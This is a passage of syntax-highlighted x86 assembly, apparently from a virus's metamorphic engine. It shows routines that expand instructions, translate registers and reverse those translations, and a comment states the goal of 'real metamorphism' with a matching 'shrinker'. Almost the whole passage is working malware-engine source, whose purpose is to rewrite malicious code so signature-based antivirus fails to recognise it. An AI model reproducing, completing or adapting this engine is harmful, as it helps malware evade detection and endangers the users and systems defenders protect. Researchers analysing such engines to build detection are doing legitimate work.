                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">  </span><span class="sc1">; Translate it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save it</span><span class="sc0">
    </span><span class="sc5">@@KeepRegisterTranslation</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">@@Expand</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; mov     eax, [esi]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">XpandThisInstruction</span><span class="sc0">  </span><span class="sc1">; Call to expand the current</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is it the last?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Expand</span><span class="sc0">                              </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_UpdateLabels</span><span class="sc0">    </span><span class="sc1">; Update the labels along the</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; code and finish</span><span class="sc0">
</span><span class="sc5">XpandCode</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function checks if the register passed at EAX exists in any other</span><span class="sc0">
</span><span class="sc1">;; variable of register translation (i.e. if any other register is translated</span><span class="sc0">
</span><span class="sc1">;; to that one). If it is, it returns with EAX = 0. If not, sets the number</span><span class="sc0">
</span><span class="sc1">;; of register in EAX in the register translation variable of the register</span><span class="sc0">
</span><span class="sc1">;; EBX, and returns with EAX = 1.</span><span class="sc0">
</span><span class="sc5">Xpand_SetRegister4Xlation</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check if the register in</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">              </span><span class="sc1">; EAX is used by other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; register to be translated</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">              </span><span class="sc1">; as that one.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">              </span><span class="sc1">; If so, return with EAX = 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Jump to the corresponding variable</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt0</span><span class="sc0">      </span><span class="sc1">; setting to translate the register in</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; EBX.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt5</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetAt6</span><span class="sc0">
    </span><span class="sc5">@@SetAt7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set for the register EBX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">            </span><span class="sc1">; the translation in EAX.</span><span class="sc0">
    </span><span class="sc5">@@SetAt0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@SetAt1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@SetAt2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@SetAt3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@SetAt5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@SetAt6</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ReturnNoError</span><span class="sc0">
    </span><span class="sc5">@@ReturnError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Return with FALSE if error</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@ReturnNoError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Return with TRUE if all OK</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xpand_SetRegister4Xlation</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function will translate the register in EAX by the corresponding</span><span class="sc0">
</span><span class="sc1">;; new register, also in EAX.</span><span class="sc0">
</span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Jump to the corresponding variable usage.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">    </span><span class="sc1">; Return ESP for ESP (no translation).</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get5</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get6</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Get7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">; If the register is &gt;= 8, return 8.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the translation and</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                              </span><span class="sc1">; return.</span><span class="sc0">
      </span><span class="sc5">@@Get0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Get6</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register6</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function returns the register in reverse translation, it means, the</span><span class="sc0">
</span><span class="sc1">;; register that the register in EAX is translated to. It's the inversed</span><span class="sc0">
</span><span class="sc1">;; operation that performs Xpand_TranslateRegister, so if we get a register,</span><span class="sc0">
</span><span class="sc1">;; we translate it with Xpand_TranslateRegister and we pass the result to</span><span class="sc0">
</span><span class="sc1">;; this function, we'll get the original register. This function is useful</span><span class="sc0">
</span><span class="sc1">;; to know which register we must use before the expansion when we want a</span><span class="sc0">
</span><span class="sc1">;; specific register in the expanded result.</span><span class="sc0">
</span><span class="sc5">Xpand_ReverseTranslation</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">        </span><span class="sc1">; Find the register in the register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register0</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; translation variables</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return5</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return6</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; When we find it, return the number</span><span class="sc0">
     </span><span class="sc5">@@Return0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; of register that uses that variable</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; for translating itself.</span><span class="sc0">
     </span><span class="sc5">@@Return1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Return2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Return3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Return5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Return6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Return7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xpand_ReverseTranslation</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; To make a real metamorphism we have a way of coding every instruction, in</span><span class="sc0">
</span><span class="sc1">;; both instruction expansion and reassembling. So, we check all the possible</span><span class="sc0">
</span><span class="sc1">;; pseudo-opcodes and we make a formula for them. The formulas used here must</span><span class="sc0">
</span><span class="sc1">;; be recognized by the shrinker.</span><span class="sc0">
</span><span class="sc5">XpandThisInstruction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Copy it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; Set the new pointers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the opcode</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">        </span><span class="sc1">; Generic 32 bits operation?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Xpand_Next001</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@Generic</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the 8 bits flag (0 or 80h)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">             </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the type of operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; OP Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPRegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; OP Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPRegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; OP Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPRegMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; OP Mem,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPMemReg</span><span class="sc0">
     </span><span class="sc5">@@OPMemImm</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the 8 bits flag</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; If 0, jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OPMemImm32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get the Imm</span><span class="sc0">
